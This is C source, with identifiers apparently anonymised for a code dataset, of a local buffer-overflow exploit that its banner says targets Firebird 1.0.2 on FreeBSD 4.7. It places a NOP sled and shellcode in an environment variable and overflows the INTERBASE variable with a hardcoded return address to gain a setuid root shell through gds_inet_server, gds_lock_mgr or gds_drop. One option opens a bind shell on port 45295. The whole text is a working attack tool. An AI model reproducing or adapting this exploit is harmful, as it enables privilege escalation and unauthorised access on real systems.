
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int buffer ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 scalar_t__ FUNC_0 (char*) ;
 int VAR_4 ;
 int FUNC_1 (int ,int ,int *) ;
 int FUNC_2 (int ) ;
 int FUNC_3 (int ,char*,...) ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_4 (char*,char*,int) ;
 int FUNC_5 (char*,int,int) ;
 int FUNC_6 (char*,...) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (char*,char*,int) ;
 int VAR_7 ;
 int FUNC_9 (char*) ;

int FUNC_10(int VAR_8, char **VAR_9)
{

 unsigned long VAR_10 = 0xbfbff75d;

 char *VAR_11;
 char VAR_12[VAR_2];
 char VAR_13[1024];
 char *VAR_14;
 int VAR_15=0;



 if(VAR_8 < 2)
 {
  FUNC_6("( ( Firebird-1.0.2 Local exploit for Freebsd 4.7 ) )\n");
  FUNC_6("( (                           by - bob@dtors.net ) )\n");
  FUNC_6("----------------------------------------------------\n\n");
  FUNC_6("Usage: %s <target#> \n", VAR_9[0]);
  FUNC_6("Targets:\n");
  FUNC_6("1. [0xbfbff75c] - gds_inet_server\n");
  FUNC_6("2. [0xbfbff75d] - gds_lock_mgr\n");
  FUNC_6("3. [0xbfbff75e] - gds_drop\n");
  FUNC_6("\nwww.dtors.net\n");
  FUNC_2(0);
 }

 VAR_11 = (char *)FUNC_0(VAR_9[1]);
   FUNC_5(VAR_12, 0x41, sizeof(VAR_12));

        VAR_14 = VAR_13;

        for (VAR_15 = 0; VAR_15 < 1024 - FUNC_9(VAR_11) -1; VAR_15++) *(VAR_14++) = 0x90;
        for (VAR_15 = 0; VAR_15 < FUNC_9(VAR_11); VAR_15++) *(VAR_14++) = VAR_11[VAR_15];
        VAR_13[1024 - 1] = '\0';

        FUNC_4(VAR_13,"EGG=",4);
        FUNC_7(VAR_13);

        FUNC_4(&VAR_12[1028],(char *)&VAR_10,4);
        VAR_12[1032] = 0;

        FUNC_8("INTERBASE", VAR_12, 1);

        FUNC_3(VAR_7, "Return Address: 0x%lx\n", VAR_10);
        FUNC_3(VAR_7, "Buffer Size: %d\n", VAR_2);
        FUNC_3(VAR_7, "Setuid [90]\n");

if(VAR_11 == (char *)&VAR_5)
  {
 FUNC_1(VAR_1, VAR_1, ((void*)0));
 return 0;
   }

if(VAR_11 == (char *)&VAR_6)
  {
  FUNC_6("\nShell is on port 45295\nExploit will hang!\n");
 FUNC_1(VAR_3, VAR_3, ((void*)0));
 return 0;
   }

if(VAR_11 == (char *)&VAR_4)
  {
 FUNC_1(VAR_0, VAR_0, ((void*)0));
 return 0;
   }


 return 0;
}
